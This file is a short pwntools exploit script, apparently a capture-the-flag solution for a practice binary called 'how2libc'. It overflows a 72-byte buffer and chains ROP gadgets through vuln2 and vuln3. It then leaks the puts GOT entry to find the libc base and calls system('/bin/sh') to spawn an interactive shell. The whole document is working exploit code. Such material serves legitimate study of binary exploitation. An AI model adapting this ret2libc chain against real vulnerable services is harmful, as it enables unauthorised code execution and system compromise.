from pwn import *


context.binary = elf = ELF("how2libc")

libc = ELF("libc.so.6")
#io = remote("localhost", 2727)
io = process("./how2libc_patched")
io.recvuntil(b"input: ")

rop = ROP(elf)
rop.raw(b"A"*72)
rop.raw(rop.ret.address)
rop.vuln2()
io.sendline(rop.chain())

io.recvuntil(b"input: ")
rop = ROP(elf)
rop.raw(b"A"*72)
rop.raw(rop.ret.address)
rop.raw(rop.rdi)
rop.raw(0xdeadbeef)
rop.vuln3()

io.sendline(rop.chain())


io.recvuntil(b"0x7ffeef000):")
rop = ROP(elf)
rop.raw(hex(elf.got["puts"]))

io.sendline(rop.chain())

io.recvuntil(b"is: ")
libc.address = int(io.recvline().strip(), 16) - libc.sym["puts"]
print("libc base address: ", hex(libc.address))

io.recvuntil(b"input:")
rop = ROP(libc)
rop.raw(b"A"*72)
rop.raw(rop.ret.address)
rop.raw(rop.rdi)
rop.raw(next(libc.search(b"/bin/sh")))
rop.raw(libc.sym["system"])

io.sendline(rop.chain())
io.interactive()
